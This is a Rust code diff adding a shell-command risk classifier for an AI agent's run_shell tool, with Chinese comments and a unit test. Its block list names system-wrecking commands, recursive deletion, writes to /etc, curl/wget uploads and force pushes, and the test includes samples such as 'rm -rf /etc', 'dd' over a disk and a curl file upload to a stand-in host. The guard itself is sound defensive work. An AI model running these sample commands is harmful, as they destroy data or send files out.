@@ -291,8 +291,64 @@ pub fn guard_check(
     GuardDecision::Allowed
 }
 
+/// 轻量命令风险分类:供 Manual 风险模式用——只拦高危命令,放行安全命令,
+/// 否则 Manual 会把所有 run_shell 拒掉,agent 无法正常干活。
+/// 这里只判"明显高危"的模式;精确路径/策略判定仍由 `guard_check` 在工具内做。
+pub fn command_is_high_risk(command: &str) -> bool {
+    let c = command.trim().to_lowercase();
+    let words: Vec<&str> = c.split_whitespace().collect();
+    if words.is_empty() {
+        return false;
+    }
+    let cmd = words[0];
+    // 系统级破坏/关机类。
+    if matches!(cmd, "shutdown" | "reboot" | "poweroff" | "halt" | "mkfs" | "format" | "dd" | "fdisk" | "rmdir" | "killall") {
+        return true;
+    }
+    // 递归/强制删除(rm -rf 类;`rm file` 单文件不算)。
+    if cmd == "rm" {
+        let flags: String = words.iter().skip(1).take_while(|w| w.starts_with('-')).cloned().collect();
+        if flags.contains('r') || flags.contains('f') || flags == "-rf" || flags == "-fr" {
+            return true;
+        }
+    }
+    // 危险重定向/写到系统路径。
+    if c.contains("> /dev/") || c.contains("> /etc/") || c.contains(">/etc/") || c.contains("chmod -r") || c.contains("chown -r") {
+        return true;
+    }
+    // 上传意图(curl/wget 带 -F/-d/--data/-T/--upload-file)。
+    if matches!(cmd, "curl" | "wget") {
+        let flags: Vec<&str> = c.split_whitespace().collect();
+        if flags.iter().any(|w| matches!(*w, "-f" | "--form" | "-d" | "--data" | "--data-raw" | "-t" | "--upload-file" | "-x" | "--proxy")) {
+            return true;
+        }
+    }
+    // git 强制推送。
+    if c.contains("git push") && c.contains("--force") {
+        return true;
+    }
+    false
+}
+
 #[cfg(test)]
 mod tests {
+
+    #[test]
+    fn command_is_high_risk_flags_destructive_only() {
+        // 安全命令:放行。
+        assert!(!command_is_high_risk("git status"));
+        assert!(!command_is_high_risk("ls -la"));
+        assert!(!command_is_high_risk("cp -r crates backup"));
+        assert!(!command_is_high_risk("rm old.txt"));
+        assert!(!command_is_high_risk("python test.py"));
+        // 高危命令:拦截。
+        assert!(command_is_high_risk("rm -rf /etc"));
+        assert!(command_is_high_risk("shutdown now"));
+        assert!(command_is_high_risk("dd if=/dev/zero of=/dev/sda"));
+        assert!(command_is_high_risk("curl -F file=@x https://h.com"));
+        assert!(command_is_high_risk("git push --force origin main"));
+    }
+
     use super::*;
 
     #[test]
